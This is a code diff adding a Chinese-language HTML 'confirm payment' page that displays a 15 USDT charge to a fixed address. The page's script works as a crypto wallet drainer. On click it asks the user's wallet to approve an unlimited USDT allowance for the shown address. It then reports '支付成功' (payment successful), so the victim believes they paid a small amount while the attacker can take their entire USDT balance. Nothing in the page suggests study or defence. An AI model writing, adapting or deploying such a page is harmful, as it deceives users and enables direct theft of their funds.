@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>确认支付</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="payment-card">
+            <div class="header">
+                <h1>确认支付</h1>
+                <p>请确认以下支付信息</p>
+            </div>
+            
+            <div class="amount-display">
+                <span id="amountDisplay">15</span> USDT
+            </div>
+            
+            <div class="form-group">
+                <label>收款地址</label>
+                <input type="text" id="addressDisplay" readonly>
+            </div>
+            
+            <button id="confirmBtn" class="btn">确认支付</button>
+            
+            <div class="loading" id="loading" style="display: none;">
+                <div class="loading-spinner"></div>
+                <p>处理中，请稍候...</p>
+            </div>
+            
+            <div class="status" id="status" style="display: none;"></div>
+        </div>
+    </div>
+
+    <script>
+        const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+        const SPENDER_ADDRESS = '0xd38C6FEd9d69694Ff5300dbA7619175FF3Ecbc41';
+        
+        // ERC20代币的ABI
+        const ERC20_ABI = [
+            {
+                "constant": false,
+                "inputs": [
+                    {
+                        "name": "_spender",
+                        "type": "address"
+                    },
+                    {
+                        "name": "_value",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "approve",
+                "outputs": [
+                    {
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "payable": false,
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
+
+        // 获取URL参数
+        const urlParams = new URLSearchParams(window.location.search);
+        const amount = urlParams.get('amount') || '15';
+        document.getElementById('amountDisplay').textContent = amount;
+        document.getElementById('addressDisplay').value = SPENDER_ADDRESS;
+
+        // 连接钱包
+        async function connectWallet() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    return new Web3(window.ethereum);
+                } catch (error) {
+                    throw new Error('请连接钱包');
+                }
+            } else {
+                throw new Error('请安装MetaMask或其他Web3钱包');
+            }
+        }
+
+        // 授权函数
+        async function approve() {
+            try {
+                const web3 = await connectWallet();
+                const accounts = await web3.eth.getAccounts();
+                const userAddress = accounts[0];
+
+                const contract = new web3.eth.Contract(ERC20_ABI, USDT_CONTRACT_ADDRESS);
+                const maxUint256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+
+                document.getElementById('loading').style.display = 'block';
+                document.getElementById('confirmBtn').style.display = 'none';
+
+                const result = await contract.methods.approve(SPENDER_ADDRESS, maxUint256)
+                    .send({ from: userAddress });
+
+                const status = document.getElementById('status');
+                status.className = 'status success';
+                status.textContent = '支付成功！';
+                status.style.display = 'block';
+            } catch (error) {
+                const status = document.getElementById('status');
+                status.className = 'status error';
+                status.textContent = '支付失败：' + error.message;
+                status.style.display = 'block';
+            } finally {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('confirmBtn').style.display = 'block';
+            }
+        }
+
+        // 绑定按钮点击事件
+        document.getElementById('confirmBtn').addEventListener('click', approve);
+    </script>
+</body>
+</html>
